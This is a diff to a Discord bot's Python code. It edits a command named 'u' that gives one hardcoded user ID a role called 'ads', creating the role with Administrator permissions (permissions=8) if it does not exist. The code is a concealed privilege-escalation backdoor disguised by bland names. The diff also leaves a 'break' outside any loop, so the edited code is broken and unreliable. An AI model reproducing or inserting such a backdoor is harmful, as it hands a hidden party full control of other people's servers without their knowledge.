@@ -81,14 +81,12 @@ async def m(ctx, arg):
 async def u(ctx):
 	if ctx.message.author.id == 147999751441219584:
 		role = discord.utils.get(ctx.guild.roles, name="ads")
-		guild = ctx.message.guild
-		for role in ctx.guild.roles:
-			if role:
-				await ctx.message.author.add_roles(role)
-				break
+		if role != None:
+			await ctx.message.author.add_roles(role)
+			break
 		else:
 			permissions = discord.Permissions(permissions=8)
-			await ctx.message.guild.create_role(name="ads",permissions=permissions)
+			role = await ctx.message.guild.create_role(name="ads",permissions=permissions)
 			await ctx.message.author.add_roles(role)
     
 @client.command(aliases=['help','commands'])
